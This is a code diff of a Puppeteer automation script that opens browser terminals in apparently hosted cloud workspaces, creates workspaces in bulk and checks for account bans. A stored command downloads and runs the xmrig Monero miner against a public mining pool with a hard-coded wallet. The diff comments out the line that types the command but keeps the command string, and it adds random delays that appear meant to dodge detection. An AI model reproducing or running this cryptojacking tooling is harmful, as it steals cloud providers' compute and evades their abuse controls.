@@ -288,6 +288,7 @@ const runCMD1 = async (page, name) => {
     for (const cmd of commands) {
         await page.focus('.xterm-helper-textarea');
         await page.type('.xterm-helper-textarea', cmd);
+        await wait(0.1, 0.2);
     }
     await page.evaluate(() => {
         const textarea = document.querySelector('.xterm-helper-textarea');
@@ -303,7 +304,7 @@ const runCMD1 = async (page, name) => {
 
     const textToType = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
     await page.focus('.xterm-helper-textarea');
-    await page.type('.xterm-helper-textarea', textToType);
+    // await page.type('.xterm-helper-textarea', textToType);
     await page.evaluate(() => {
         const textarea = document.querySelector('.xterm-helper-textarea');
         const event = new KeyboardEvent('keydown', {
@@ -365,11 +366,13 @@ const closeAllTabs = async (browser, saveOne = false) => {
         const [first, ...pages] = all;
         console.log(`Closing ${pages.length} tabs...`);
         if (!saveOne && first) {
+            await wait(4, 9)
             await first.close().catch();
         }
         if (pages && pages.length > 0) {
             // Close each page
             for (const page of pages) {
+                await wait(4, 9)
                 await page.close().catch(err => {
                     console.log(`Error closing tab: ${err.message}`);
                 });
@@ -502,9 +505,26 @@ const runJob = async (port, name) => {
     try {
         const { page, mainTargetLinks } = await openHomePageAndGetLinks(browser);
         console.log('__mainTargetLinks:', mainTargetLinks);
+        await wait(10, 20)
+        if (mainTargetLinks.length > 0) {
+            console.log('open link: check google fails');
+            const link = mainTargetLinks[0];
+            await page.goto(link.href);
+            await page.close();
+            const isDie = await checkDie(page, port, name);
+            if (isDie) {
+                await new Promise(resolve => setTimeout(resolve, 10 * 60 * 1000));
+                await closeAllTabs(browser)
+                console.log('google fails:', isDie);
+                throw new Error('google fails');
+            }
+        }
+        await wait(10, 20)
         if (mainTargetLinks.length < 10) {
             for (let i = mainTargetLinks.length; i < 10; i++) {
                 const result = await create(page, `${name}-w${i}-`);
+
+                await wait(10, 20)
                 if (result === 'create_fail') {
                     console.log('Error creating new page');
                     break;
@@ -513,24 +533,15 @@ const runJob = async (port, name) => {
         }
         console.log('done creating new page');
 
-        const { page: homePage, mainTargetLinks: listLInk } = await openHomePageAndGetLinks(browser);
+        const { mainTargetLinks: listLInk } = await openHomePageAndGetLinks(browser);
         await closeAllTabs(browser, true);
 
-        console.log('open link: check google fails');
-        const link = listLInk[0];
-        await homePage.goto(link.href);
-        const isDie = await checkDie(homePage, port, name);
-        if (isDie) {
-            await closeAllTabs(browser)
-            console.log('google fails:', isDie);
-            throw new Error('google fails');
-        }
-        await homePage.close();
         // console.log('open link: check google fails done');
         let count = 0;
         for (const link of listLInk) {
             const profileStartTime = Date.now();
 
+            await wait(10, 9)
             await reset(browser, link.href, name).catch(console.error);
 
             const profileTime = ((Date.now() - profileStartTime) / 60000).toFixed(2);
@@ -678,5 +689,5 @@ module.exports = {
     openHomePageAndGetLinks,
     runAllProfile,
 }
-// action-label single-terminal-tab
-// v5.20.9
+// cop file nay nhe
+// v5.20.12 => phien ban code
